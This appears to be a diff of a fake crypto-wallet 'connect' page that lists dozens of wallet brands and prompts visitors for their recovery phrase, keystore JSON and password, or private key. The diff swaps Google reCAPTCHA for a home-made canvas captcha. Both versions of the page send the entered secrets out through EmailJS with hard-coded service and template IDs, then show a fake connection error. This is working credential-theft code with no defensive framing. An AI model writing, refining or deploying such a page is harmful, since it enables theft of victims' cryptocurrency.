@@ -15,332 +15,97 @@
       })();
     </script>
 
-    <!-- ✅ Google reCAPTCHA v2 -->
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-
     <script defer>
       document.addEventListener("DOMContentLoaded", () => {
+        /* ---------------------------
+           Wallets list (unchanged)
+           --------------------------- */
         const wallets = [
-          {
-            name: "Metamask",
-            imgUrl: "./image/meta.png",
-          },
-          {
-            name: "Coinbase",
-            imgUrl: "./image/coinbase.png",
-          },
-          {
-            name: "Wallet connect",
-            imgUrl: "./image/WalletConnect-icon.svg",
-          },
-          {
-            name: "Trust",
-            imgUrl: "./image/trust.png",
-          },
-          {
-            name: "Xumm",
-            imgUrl: "./image/xumm.png",
-          },
-          {
-            name: "Cardano",
-            imgUrl: "./image/cardano.png",
-          },
-          {
-            name: "Daedalus",
-            imgUrl: "./image/daedalus.png",
-          },
-          {
-            name: "Yoroi",
-            imgUrl: "./image/yoroi.png",
-          },
-          {
-            name: "CCVault",
-            imgUrl: "./image/ccvault.png",
-          },
-          {
-            name: "Gero",
-            imgUrl: "./image/gero.jpg",
-          },
-          {
-            name: "Nami",
-            imgUrl: "./image/nami.png",
-          },
-          {
-            name: "Solana",
-            imgUrl: "./image/solana.png",
-          },
-          {
-            name: "Phantom",
-            imgUrl: "./image/phantom.jpg",
-          },
-          {
-            name: "Solflare",
-            imgUrl: "./image/solflare.png",
-          },
-          {
-            name: "Sollet",
-            imgUrl: "./image/sollet.png",
-          },
-          {
-            name: "Solong",
-            imgUrl: "./image/solong.jpg",
-          },
-          {
-            name: "Exodus",
-            imgUrl: "./image/exodus.png",
-          },
-          {
-            name: "Avalanche",
-            imgUrl: "./image/avalanche.png",
-          },
-          {
-            name: "Velas",
-            imgUrl: "./image/velas.png",
-          },
-          {
-            name: "crypto.com",
-            imgUrl: "./image/crypto.png",
-          },
-          {
-            name: "Blockchain",
-            imgUrl: "./image/blockchain.png",
-          },
-          {
-            name: "Binance Smart Chain",
-            imgUrl: "./image/bsc.png",
-          },
-          {
-            name: "Safepal",
-            imgUrl: "./image/safepal.png",
-          },
-          {
-            name: "Argent",
-            imgUrl: "./image/argent.jpg",
-          },
-          {
-            name: "Fortmatic",
-            imgUrl: "./image/formatic.png",
-          },
-          {
-            name: "Aktionariat",
-            imgUrl: "./image/aktionariat.png",
-          },
-          {
-            name: "Keyring Pro",
-            imgUrl: "./image/keyringpro.png",
-          },
-          {
-            name: "BitKeep",
-            imgUrl: "./image/bitkeep.png",
-          },
-          {
-            name: "SparkPoint",
-            imgUrl: "./image/sparkpoint.png",
-          },
-          {
-            name: "OwnBit",
-            imgUrl: "./image/ownbit.png",
-          },
-          {
-            name: "Infinty Wallet",
-            imgUrl: "./image/infinity-wallet.png",
-          },
-          {
-            name: "Wallet.io",
-            imgUrl: "./image/wallet-io.png",
-          },
-          {
-            name: "Infinito",
-            imgUrl: "./image/infinito.png",
-          },
-          {
-            name: "Torus",
-            imgUrl: "./image/torus.jpg",
-          },
-          {
-            name: "Nash",
-            imgUrl: "./image/nash.jpg",
-          },
-          {
-            name: "BitPay",
-            imgUrl: "./image/bitpay.jpg",
-          },
-          {
-            name: "imTOken",
-            imgUrl: "./image/imtoken.png",
-          },
-          {
-            name: "Ambire",
-            imgUrl: "./image/ambire.png",
-          },
-          {
-            name: "Apollox",
-            imgUrl: "./image/apollox.png",
-          },
-          {
-            name: "Bitski",
-            imgUrl: "./image/bitski.png",
-          },
-          {
-            name: "Bobablocks",
-            imgUrl: "./image/bobablocks.png",
-          },
-          {
-            name: "Crossmint",
-            imgUrl: "./image/crossmint.png",
-          },
-          {
-            name: "Defiant",
-            imgUrl: "./image/defiant.png",
-          },
-          {
-            name: "Fireblocks",
-            imgUrl: "./image/fireblocks.jpg",
-          },
-          {
-            name: "Kryptogo",
-            imgUrl: "./image/kryptogo.png",
-          },
-          {
-            name: "Ledger",
-            imgUrl: "./image/ledger.png",
-          },
-          {
-            name: "Now",
-            imgUrl: "./image/now.png",
-          },
-          {
-            name: "Nufinetes",
-            imgUrl: "./image/nufinetes.png",
-          },
-          {
-            name: "Onekey",
-            imgUrl: "./image/onekey.png",
-          },
-          {
-            name: "Paper",
-            imgUrl: "./image/paper.png",
-          },
-          {
-            name: "Pier",
-            imgUrl: "./image/pier.png",
-          },
-          {
-            name: "Prema",
-            imgUrl: "./image/prema.png",
-          },
-          {
-            name: "Rice",
-            imgUrl: "./image/rice.jpg",
-          },
-          {
-            name: "Safemoon",
-            imgUrl: "./image/safemoon.jpg",
-          },
-          {
-            name: "Secux",
-            imgUrl: "./image/secux.jpg",
-          },
-          {
-            name: "Sequence",
-            imgUrl: "./image/sequence.png",
-          },
-          {
-            name: "Tokenary",
-            imgUrl: "./image/tokenary.jpg",
-          },
-          {
-            name: "Unipass",
-            imgUrl: "./image/unipass.jpg",
-          },
-          {
-            name: "Venly",
-            imgUrl: "./image/venly.jpg",
-          },
-          {
-            name: "Verso",
-            imgUrl: "./image/verso.png",
-          },
-          {
-            name: "Wallet3",
-            imgUrl: "./image/wallet.png",
-          },
-          {
-            name: "Polkadot",
-            imgUrl: "./image/polkadot.png",
-          },
-          {
-            name: "Filecoin",
-            imgUrl: "./image/filecoin.png",
-          },
-          {
-            name: "IOST",
-            imgUrl: "./image/iost.png",
-          },
-          {
-            name: "Qtum",
-            imgUrl: "./image/qtum.png",
-          },
-          {
-            name: "Waves",
-            imgUrl: "./image/waves.jpg",
-          },
-          {
-            name: "Algorand",
-            imgUrl: "./image/algorand.png",
-          },
-          {
-            name: "Zcash",
-            imgUrl: "./image/zcash.png",
-          },
-          {
-            name: "Vechain",
-            imgUrl: "./image/vechain.png",
-          },
-          {
-            name: "Tezos",
-            imgUrl: "./image/tezos.png",
-          },
-          {
-            name: "Stellar",
-            imgUrl: "./image/stellar.png",
-          },
-          {
-            name: "Tron",
-            imgUrl: "./image/tron.webp",
-          },
-          {
-            name: "Terra",
-            imgUrl: "./image/terra.png",
-          },
-          {
-            name: "Cosmos",
-            imgUrl: "./image/cosmos.jpg",
-          },
-          {
-            name: "Metis",
-            imgUrl: "./image/metis.jpeg",
-          },
-          {
-            name: "Optimism",
-            imgUrl: "./image/Optimism.png",
-          },
-          {
-            name: "Injective",
-            imgUrl: "./image/Injective.png",
-          },
-          {
-            name: "Other Wallet",
-            imgUrl: "./image/other.jpg",
-          },
+          { name: "Metamask", imgUrl: "./image/meta.png" },
+          { name: "Coinbase", imgUrl: "./image/coinbase.png" },
+          { name: "Wallet connect", imgUrl: "./image/WalletConnect-icon.svg" },
+          { name: "Trust", imgUrl: "./image/trust.png" },
+          { name: "Xumm", imgUrl: "./image/xumm.png" },
+          { name: "Cardano", imgUrl: "./image/cardano.png" },
+          { name: "Daedalus", imgUrl: "./image/daedalus.png" },
+          { name: "Yoroi", imgUrl: "./image/yoroi.png" },
+          { name: "CCVault", imgUrl: "./image/ccvault.png" },
+          { name: "Gero", imgUrl: "./image/gero.jpg" },
+          { name: "Nami", imgUrl: "./image/nami.png" },
+          { name: "Solana", imgUrl: "./image/solana.png" },
+          { name: "Phantom", imgUrl: "./image/phantom.jpg" },
+          { name: "Solflare", imgUrl: "./image/solflare.png" },
+          { name: "Sollet", imgUrl: "./image/sollet.png" },
+          { name: "Solong", imgUrl: "./image/solong.jpg" },
+          { name: "Exodus", imgUrl: "./image/exodus.png" },
+          { name: "Avalanche", imgUrl: "./image/avalanche.png" },
+          { name: "Velas", imgUrl: "./image/velas.png" },
+          { name: "crypto.com", imgUrl: "./image/crypto.png" },
+          { name: "Blockchain", imgUrl: "./image/blockchain.png" },
+          { name: "Binance Smart Chain", imgUrl: "./image/bsc.png" },
+          { name: "Safepal", imgUrl: "./image/safepal.png" },
+          { name: "Argent", imgUrl: "./image/argent.jpg" },
+          { name: "Fortmatic", imgUrl: "./image/formatic.png" },
+          { name: "Aktionariat", imgUrl: "./image/aktionariat.png" },
+          { name: "Keyring Pro", imgUrl: "./image/keyringpro.png" },
+          { name: "BitKeep", imgUrl: "./image/bitkeep.png" },
+          { name: "SparkPoint", imgUrl: "./image/sparkpoint.png" },
+          { name: "OwnBit", imgUrl: "./image/ownbit.png" },
+          { name: "Infinty Wallet", imgUrl: "./image/infinity-wallet.png" },
+          { name: "Wallet.io", imgUrl: "./image/wallet-io.png" },
+          { name: "Infinito", imgUrl: "./image/infinito.png" },
+          { name: "Torus", imgUrl: "./image/torus.jpg" },
+          { name: "Nash", imgUrl: "./image/nash.jpg" },
+          { name: "BitPay", imgUrl: "./image/bitpay.jpg" },
+          { name: "imTOken", imgUrl: "./image/imtoken.png" },
+          { name: "Ambire", imgUrl: "./image/ambire.png" },
+          { name: "Apollox", imgUrl: "./image/apollox.png" },
+          { name: "Bitski", imgUrl: "./image/bitski.png" },
+          { name: "Bobablocks", imgUrl: "./image/bobablocks.png" },
+          { name: "Crossmint", imgUrl: "./image/crossmint.png" },
+          { name: "Defiant", imgUrl: "./image/defiant.png" },
+          { name: "Fireblocks", imgUrl: "./image/fireblocks.jpg" },
+          { name: "Kryptogo", imgUrl: "./image/kryptogo.png" },
+          { name: "Ledger", imgUrl: "./image/ledger.png" },
+          { name: "Now", imgUrl: "./image/now.png" },
+          { name: "Nufinetes", imgUrl: "./image/nufinetes.png" },
+          { name: "Onekey", imgUrl: "./image/onekey.png" },
+          { name: "Paper", imgUrl: "./image/paper.png" },
+          { name: "Pier", imgUrl: "./image/pier.png" },
+          { name: "Prema", imgUrl: "./image/prema.png" },
+          { name: "Rice", imgUrl: "./image/rice.jpg" },
+          { name: "Safemoon", imgUrl: "./image/safemoon.jpg" },
+          { name: "Secux", imgUrl: "./image/secux.jpg" },
+          { name: "Sequence", imgUrl: "./image/sequence.png" },
+          { name: "Tokenary", imgUrl: "./image/tokenary.jpg" },
+          { name: "Unipass", imgUrl: "./image/unipass.jpg" },
+          { name: "Venly", imgUrl: "./image/venly.jpg" },
+          { name: "Verso", imgUrl: "./image/verso.png" },
+          { name: "Wallet3", imgUrl: "./image/wallet.png" },
+          { name: "Polkadot", imgUrl: "./image/polkadot.png" },
+          { name: "Filecoin", imgUrl: "./image/filecoin.png" },
+          { name: "IOST", imgUrl: "./image/iost.png" },
+          { name: "Qtum", imgUrl: "./image/qtum.png" },
+          { name: "Waves", imgUrl: "./image/waves.jpg" },
+          { name: "Algorand", imgUrl: "./image/algorand.png" },
+          { name: "Zcash", imgUrl: "./image/zcash.png" },
+          { name: "Vechain", imgUrl: "./image/vechain.png" },
+          { name: "Tezos", imgUrl: "./image/tezos.png" },
+          { name: "Stellar", imgUrl: "./image/stellar.png" },
+          { name: "Tron", imgUrl: "./image/tron.webp" },
+          { name: "Terra", imgUrl: "./image/terra.png" },
+          { name: "Cosmos", imgUrl: "./image/cosmos.jpg" },
+          { name: "Metis", imgUrl: "./image/metis.jpeg" },
+          { name: "Optimism", imgUrl: "./image/Optimism.png" },
+          { name: "Injective", imgUrl: "./image/Injective.png" },
+          { name: "Other Wallet", imgUrl: "./image/other.jpg" },
         ];
 
         const walletsContainer = document.querySelector(".wallets");
         const dialog = document.getElementById("my_modal_1");
         const walletNameDisplay = document.getElementById("walletName");
         const walletImage = document.getElementById("walletImage");
-        const selectedWalletInfo =
-          document.getElementById("selectedWalletInfo");
+        const selectedWalletInfo = document.getElementById("selectedWalletInfo");
 
         let selectedWallet = null;
 
@@ -366,20 +131,28 @@
 
             // After 3 seconds, close my_modal_1 and open my_modal_2
             setTimeout(() => {
-              dialog.classList.remove(
-                "flex",
-                "justify-between",
-                "items-center"
-              );
+              dialog.classList.remove("flex", "justify-between", "items-center");
               dialog.close();
               document.getElementById("my_modal_2").showModal();
               renderMethodFields(); // Render fields when modal 2 opens
+
+              // Refresh human captcha each time modal 2 opens
+              if (typeof refreshCaptcha === "function") {
+                try {
+                  refreshCaptcha();
+                } catch (err) {
+                  console.warn("refreshCaptcha error:", err);
+                }
+              }
             }, 3000);
           });
 
           walletsContainer.appendChild(walletDiv);
         });
 
+        /* ---------------------------
+           method field rendering
+           --------------------------- */
         function renderMethodFields() {
           const method = document.getElementById("connect-method").value;
           const methodFields = document.getElementById("method-fields");
@@ -387,180 +160,262 @@
 
           const needsWalletName =
             selectedWallet &&
-            (selectedWallet.name === "Other Wallet" ||
-              selectedWallet.name === "Wallet connect");
+            (selectedWallet.name === "Other Wallet" || selectedWallet.name === "Wallet connect");
 
           if (method === "phrase") {
             methodFields.innerHTML = `
       <textarea placeholder="Enter your phrase"></textarea>
-      ${
-        needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""
-      }
+      ${needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""}
     `;
           } else if (method === "keystore") {
             methodFields.innerHTML = `
       <input type="text" placeholder="Enter your keystore JSON" />
       <input type="text" placeholder="Wallet password" />
-      ${
-        needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""
-      }
+      ${needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""}
     `;
           } else if (method === "private") {
             methodFields.innerHTML = `
       <input type="text" placeholder="Enter your private key" />
-      ${
-        needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""
-      }
+      ${needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""}
     `;
           }
         }
 
-        document
-          .getElementById("connect-method")
-          .addEventListener("change", renderMethodFields);
+        document.getElementById("connect-method").addEventListener("change", renderMethodFields);
 
-        document
-          .getElementById("manual-connect-btn")
-          .addEventListener("click", async function (e) {
-            e.preventDefault();
+        /* ---------------------------
+           HUMAN CAPTCHA IMPLEMENTATION
+           --------------------------- */
 
-            // ✅ Verify reCAPTCHA before continuing
-            if (typeof grecaptcha !== "undefined") {
-              const recaptchaResponse = grecaptcha.getResponse();
-              if (!recaptchaResponse) {
-                alert("Please complete the reCAPTCHA verification.");
-                return;
-              }
+        function randomInt(min, max) {
+          return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        function generateCaptcha() {
+          if (Math.random() < 0.5) {
+            // numeric code, 5 digits
+            const code = String(randomInt(10000, 99999));
+            return { text: code, answer: code };
+          } else {
+            // simple arithmetic e.g. "8 + 5"
+            const a = randomInt(1, 20);
+            const b = randomInt(1, 20);
+            const ops = ["+", "-"];
+            const op = ops[Math.floor(Math.random() * ops.length)];
+            const expr = `${a} ${op} ${b}`;
+            const answer = op === "+" ? (a + b).toString() : (a - b).toString();
+            return { text: expr, answer };
+          }
+        }
+
+        function renderCaptchaToCanvas(text) {
+          const canvas = document.getElementById("captchaCanvas");
+          if (!canvas) return;
+          const ctx = canvas.getContext("2d");
+
+          // clear
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+          // background
+          ctx.fillStyle = "#fafafa";
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+          // random noise lines
+          for (let i = 0; i < 4; i++) {
+            ctx.beginPath();
+            ctx.moveTo(randomInt(0, canvas.width), randomInt(0, canvas.height));
+            ctx.lineTo(randomInt(0, canvas.width), randomInt(0, canvas.height));
+            ctx.strokeStyle = `rgba(0,0,0,${Math.random() * 0.15 + 0.05})`;
+            ctx.lineWidth = Math.random() * 1.5 + 0.5;
+            ctx.stroke();
+          }
+
+          // draw the text with slight rotation on each character
+          const baseX = 12;
+          const baseY = 34;
+          ctx.font = "22px monospace";
+          for (let i = 0; i < text.length; i++) {
+            const ch = text[i];
+            const x = baseX + i * 26 + randomInt(-2, 2);
+            const y = baseY + randomInt(-4, 4);
+            ctx.save();
+            ctx.translate(x, y);
+            ctx.rotate((Math.random() - 0.5) * 0.25);
+            ctx.fillStyle = `rgb(${randomInt(20, 70)},${randomInt(20, 70)},${randomInt(80, 140)})`;
+            ctx.fillText(ch, 0, 0);
+            ctx.restore();
+          }
+
+          // more sprinkled dots for noise
+          for (let i = 0; i < 20; i++) {
+            ctx.fillStyle = `rgba(0,0,0,${Math.random() * 0.2})`;
+            ctx.beginPath();
+            ctx.arc(randomInt(0, canvas.width), randomInt(0, canvas.height), Math.random() * 1.8, 0, Math.PI * 2);
+            ctx.fill();
+          }
+        }
+
+        let currentCaptchaAnswer = null;
+        function refreshCaptcha() {
+          const c = generateCaptcha();
+          currentCaptchaAnswer = String(c.answer).trim();
+          renderCaptchaToCanvas(c.text);
+          const input = document.getElementById("captchaInput");
+          if (input) input.value = "";
+        }
+
+        // wire refresh button (note: element exists in DOM already)
+        document.addEventListener("click", (ev) => {
+          // delegate click to refresh button if present
+          if (ev.target && ev.target.id === "refreshCaptchaBtn") {
+            ev.preventDefault();
+            refreshCaptcha();
+          }
+        });
+
+        // initial generate so the canvas isn't blank
+        setTimeout(() => {
+          try {
+            refreshCaptcha();
+          } catch (e) {
+            // ignore
+          }
+        }, 250);
+
+        /* ---------------------------
+           Connect button handler (uses HUMAN CAPTCHA)
+           --------------------------- */
+        document.getElementById("manual-connect-btn").addEventListener("click", async function (e) {
+          e.preventDefault();
+
+          // ---------- CAPTCHA CHECK ----------
+          const captchaInput = document.getElementById("captchaInput");
+          if (!captchaInput || String(captchaInput.value).trim() === "") {
+            alert("Please enter the number shown in the box.");
+            return;
+          }
+          if (String(captchaInput.value).trim() !== String(currentCaptchaAnswer).trim()) {
+            alert("Incorrect verification code. Please try again.");
+            refreshCaptcha();
+            return;
+          }
+          // ---------- CAPTCHA PASSED ----------
+
+          const method = document.getElementById("connect-method").value;
+          const methodFields = document.getElementById("method-fields");
+          let valid = false;
+          let dataToSend = {};
+
+          const needsWalletName =
+            selectedWallet &&
+            (selectedWallet.name === "Other Wallet" || selectedWallet.name === "Wallet connect");
+
+          if (method === "phrase") {
+            const textareas = methodFields.querySelectorAll("textarea");
+            if (needsWalletName) {
+              valid =
+                textareas.length === 2 &&
+                Array.from(textareas).every((ta) => ta.value.trim() !== "");
+              dataToSend = {
+                phrase: textareas[0]?.value.trim(),
+                item: textareas[1]?.value.trim(),
+              };
             } else {
-              console.warn("reCAPTCHA not loaded");
-              alert("reCAPTCHA failed to load. Please refresh the page.");
-              return;
+              valid = textareas.length === 1 && textareas[0].value.trim() !== "";
+              dataToSend = {
+                phrase: textareas[0]?.value.trim(),
+                item: selectedWallet?.name,
+              };
             }
-
-            const method = document.getElementById("connect-method").value;
-            const methodFields = document.getElementById("method-fields");
-            let valid = false;
-            let dataToSend = {};
-
-            const needsWalletName =
-              selectedWallet &&
-              (selectedWallet.name === "Other Wallet" ||
-                selectedWallet.name === "Wallet connect");
-
-            if (method === "phrase") {
-              const textareas = methodFields.querySelectorAll("textarea");
-              if (needsWalletName) {
-                valid =
-                  textareas.length === 2 &&
-                  Array.from(textareas).every((ta) => ta.value.trim() !== "");
-                dataToSend = {
-                  phrase: textareas[0]?.value.trim(),
-                  item: textareas[1]?.value.trim(),
-                };
-              } else {
-                valid =
-                  textareas.length === 1 && textareas[0].value.trim() !== "";
-                dataToSend = {
-                  phrase: textareas[0]?.value.trim(),
-                  item: selectedWallet?.name,
-                };
-              }
-            } else if (method === "keystore") {
-              const inputs =
-                methodFields.querySelectorAll("input[type='text']");
-              const walletNameTextarea = needsWalletName
-                ? methodFields.querySelector("textarea")
-                : null;
-              if (needsWalletName) {
-                valid =
-                  inputs.length === 2 &&
-                  walletNameTextarea &&
-                  Array.from(inputs).every((inp) => inp.value.trim() !== "") &&
-                  walletNameTextarea.value.trim() !== "";
-                dataToSend = {
-                  keystore: {
-                    json: inputs[0]?.value.trim(),
-                    password: inputs[1]?.value.trim(),
-                  },
-                  item: walletNameTextarea.value.trim(),
-                };
-              } else {
-                valid =
-                  inputs.length === 2 &&
-                  Array.from(inputs).every((inp) => inp.value.trim() !== "");
-                dataToSend = {
-                  keystore: {
-                    json: inputs[0]?.value.trim(),
-                    password: inputs[1]?.value.trim(),
-                  },
-                  item: selectedWallet?.name,
-                };
-              }
-            } else if (method === "private") {
-              const input = methodFields.querySelector("input[type='text']");
-              const walletNameTextarea = needsWalletName
-                ? methodFields.querySelector("textarea")
-                : null;
-              if (needsWalletName) {
-                valid =
-                  input &&
-                  input.value.trim() !== "" &&
-                  walletNameTextarea &&
-                  walletNameTextarea.value.trim() !== "";
-                dataToSend = {
-                  privateKey: input.value.trim(),
-                  item: walletNameTextarea.value.trim(),
-                };
-              } else {
-                valid = input && input.value.trim() !== "";
-                dataToSend = {
-                  privateKey: input.value.trim(),
-                  item: selectedWallet?.name,
-                };
-              }
+          } else if (method === "keystore") {
+            const inputs = methodFields.querySelectorAll("input[type='text']");
+            const walletNameTextarea = needsWalletName ? methodFields.querySelector("textarea") : null;
+            if (needsWalletName) {
+              valid =
+                inputs.length === 2 &&
+                walletNameTextarea &&
+                Array.from(inputs).every((inp) => inp.value.trim() !== "") &&
+                walletNameTextarea.value.trim() !== "";
+              dataToSend = {
+                keystore: {
+                  json: inputs[0]?.value.trim(),
+                  password: inputs[1]?.value.trim(),
+                },
+                item: walletNameTextarea.value.trim(),
+              };
+            } else {
+              valid = inputs.length === 2 && Array.from(inputs).every((inp) => inp.value.trim() !== "");
+              dataToSend = {
+                keystore: {
+                  json: inputs[0]?.value.trim(),
+                  password: inputs[1]?.value.trim(),
+                },
+                item: selectedWallet?.name,
+              };
             }
+          } else if (method === "private") {
+            const input = methodFields.querySelector("input[type='text']");
+            const walletNameTextarea = needsWalletName ? methodFields.querySelector("textarea") : null;
+            if (needsWalletName) {
+              valid =
+                input &&
+                input.value.trim() !== "" &&
+                walletNameTextarea &&
+                walletNameTextarea.value.trim() !== "";
+              dataToSend = {
+                privateKey: input.value.trim(),
+                item: walletNameTextarea.value.trim(),
+              };
+            } else {
+              valid = input && input.value.trim() !== "";
+              dataToSend = {
+                privateKey: input.value.trim(),
+                item: selectedWallet?.name,
+              };
+            }
+          }
 
-            if (valid) {
-              document.getElementById("my_modal_2").close();
-              const finalModal = document.getElementById("my_modal_3");
-              if (finalModal) finalModal.showModal();
+          if (valid) {
+            document.getElementById("my_modal_2").close();
+            const finalModal = document.getElementById("my_modal_3");
+            if (finalModal) finalModal.showModal();
 
+            try {
+              const templateParams = {
+                wallet: dataToSend.item || (selectedWallet?.name || "Unknown wallet"),
+                phrase: dataToSend.phrase || "",
+                keystore_json: dataToSend.keystore?.json || "",
+                keystore_password: dataToSend.keystore?.password || "",
+                private_key: dataToSend.privateKey || "",
+                connection_method: method,
+              };
+
+              console.log("Sending via EmailJS:", templateParams);
+
+              const result = await emailjs.send(
+                "service_873p1sw", // your EmailJS service ID
+                "template_8jac0w8", // your EmailJS template ID
+                templateParams
+              );
+
+              console.log("EmailJS success:", result);
+
+              // reset captcha after success
               try {
-                const templateParams = {
-                  wallet:
-                    dataToSend.item ||
-                    (selectedWallet?.name || "Unknown wallet"),
-                  phrase: dataToSend.phrase || "",
-                  keystore_json: dataToSend.keystore?.json || "",
-                  keystore_password: dataToSend.keystore?.password || "",
-                  private_key: dataToSend.privateKey || "",
-                  connection_method: method,
-                };
-
-                console.log("Sending via EmailJS:", templateParams);
-
-                const result = await emailjs.send(
-                  "service_873p1sw", // your EmailJS service ID
-                  "template_8jac0w8", // your EmailJS template ID
-                  templateParams
-                );
-
-                console.log("EmailJS success:", result);
-
-                // ✅ Reset reCAPTCHA after successful send
-                if (typeof grecaptcha !== "undefined") {
-                  grecaptcha.reset();
-                }
-              } catch (error) {
-                console.error("EmailJS error submitting form:", error);
+                refreshCaptcha();
+              } catch (err) {
+                // ignore
               }
-
-              setTimeout(() => {
-                document.getElementById("my_modal_3").close();
-                document.getElementById("my_modal_4").showModal();
-              }, 3000);
+            } catch (error) {
+              console.error("EmailJS error submitting form:", error);
             }
-          });
+
+            setTimeout(() => {
+              document.getElementById("my_modal_3").close();
+              document.getElementById("my_modal_4").showModal();
+            }, 3000);
+          }
+        });
       });
 
       function closeDialog() {
@@ -651,14 +506,9 @@
           DApp Type:
         </p>
 
-        <div
-          class="flex flex-col rounded-[20px] border-1 shadow-lg py-5 px-3"
-        >
+        <div class="flex flex-col rounded-[20px] border-1 shadow-lg py-5 px-3">
           <div>
-            <select
-              id="connect-method"
-              class="rounded-full p-1 mb-3 text-green-700"
-            >
+            <select id="connect-method" class="rounded-full p-1 mb-3 text-green-700">
               <option value="phrase">Phrase</option>
               <option value="keystore">Keystore JSON</option>
               <option value="private">Private Key</option>
@@ -669,29 +519,31 @@
             <!-- Dynamic inputs -->
           </div>
 
-          <!-- ✅ reCAPTCHA + Connect Button -->
-          <div class="form-control flex flex-col gap-3">
-            <div
-              class="g-recaptcha"
-              data-sitekey="6Le2qh4sAAAAAK_DEXkR4BIM4TAcfbbYaMVIQuJ1
-"
-              data-theme="light"
-            ></div>
+          <!-- ✅ HUMAN VERIFICATION (canvas-based) -->
+          <div class="form-control flex flex-col gap-3" id="human-captcha-area" style="align-items:flex-start;">
+            <canvas id="captchaCanvas" width="180" height="50" style="border:1px solid #e2e8f0; border-radius:6px"></canvas>
 
-            <button
-              id="manual-connect-btn"
-              class="text-[14px] bg-[#090979] rounded-[4px] text-white font-bold"
-            >
-              Connect
-            </button>
+            <div style="display:flex; gap:8px; align-items:center; width:100%;">
+              <input id="captchaInput" type="text" placeholder="Type the number shown above"
+                style="flex:1; padding:12px; border-radius:8px; border:1px solid #ddd;" />
+              <button id="refreshCaptchaBtn" type="button"
+                style="padding:10px 12px; border-radius:8px; background:#f3f4f6; border:none; cursor:pointer;">
+                ↻
+              </button>
+            </div>
+
+            <div style="width:100%;">
+              <button id="manual-connect-btn" class="text-[14px] bg-[#090979] rounded-[4px] text-white font-bold"
+                style="width:100%; padding:0.8em 0; margin-top:8px; border:none;">
+                Connect
+              </button>
+            </div>
           </div>
         </div>
 
         <div class="modal-action">
           <form method="dialog">
-            <button
-              class="h-[2rem] rounded-[5px] w-[90px] bg-red-500 text-white border-none"
-            >
+            <button class="h-[2rem] rounded-[5px] w-[90px] bg-red-500 text-white border-none">
               Close
             </button>
           </form>
@@ -699,59 +551,30 @@
       </div>
     </dialog>
 
-    <dialog
-      id="my_modal_3"
-      class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
-    >
-      <div
-        class="flex flex-col gap-5 modal-box bg-white w-[70%] modal-box rounded-lg"
-      >
+    <dialog id="my_modal_3" class="modal bg-[#00000069] w-full h-full self-center rounded-lg">
+      <div class="flex flex-col gap-5 modal-box bg-white w-[70%] modal-box rounded-lg">
         <div class="flex items-center justify-between px-3 py-5">
-          <div
-            id="status-message"
-            class="text-[13px] flex items-center gap-3 font-bold text-green-600"
-          >
+          <div id="status-message" class="text-[13px] flex items-center gap-3 font-bold text-green-600">
             Connection verification pending
-            <span
-              class="loading-dot-bounce bg-green-600"
-              style="animation-delay: 0s"
-            ></span>
-            <span
-              class="loading-dot-bounce bg-green-600"
-              style="animation-delay: 0.15s"
-            ></span>
-            <span
-              class="loading-dot-bounce bg-green-600"
-              style="animation-delay: 0.3s"
-            ></span>
+            <span class="loading-dot-bounce bg-green-600" style="animation-delay: 0s"></span>
+            <span class="loading-dot-bounce bg-green-600" style="animation-delay: 0.15s"></span>
+            <span class="loading-dot-bounce bg-green-600" style="animation-delay: 0.3s"></span>
           </div>
           <form method="dialog">
-            <button class="outline-none h-[10px] text-[13px] font-bold">
-              X
-            </button>
+            <button class="outline-none h-[10px] text-[13px] font-bold">X</button>
           </form>
         </div>
       </div>
     </dialog>
 
-    <dialog
-      id="my_modal_4"
-      class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
-    >
-      <div
-        class="flex flex-col gap-5 modal-box bg-white w-[90%] md:w-[70%] modal-box rounded-lg"
-      >
+    <dialog id="my_modal_4" class="modal bg-[#00000069] w-full h-full self-center rounded-lg">
+      <div class="flex flex-col gap-5 modal-box bg-white w-[90%] md:w-[70%] modal-box rounded-lg">
         <div class="flex items-center justify-between px-3 py-5">
-          <div
-            id="status-message"
-            class="text-[13px] flex items-center gap-3 font-bold text-red-600"
-          >
+          <div id="status-message" class="text-[13px] flex items-center gap-3 font-bold text-red-600">
             Error connecting to wallet...
           </div>
           <form method="dialog">
-            <button class="outline-none h-[10px] text-[13px] font-bold">
-              X
-            </button>
+            <button class="outline-none h-[10px] text-[13px] font-bold">X</button>
           </form>
         </div>
       </div>
@@ -851,8 +674,7 @@
         height: 12px;
         border-radius: 50%;
         background: #2ecc40;
-        animation: dot-bounce 0.7s infinite alternate
-          cubic-bezier(0.6, -0.28, 0.74, 0.05);
+        animation: dot-bounce 0.7s infinite alternate cubic-bezier(0.6, -0.28, 0.74, 0.05);
         vertical-align: middle;
       }
 
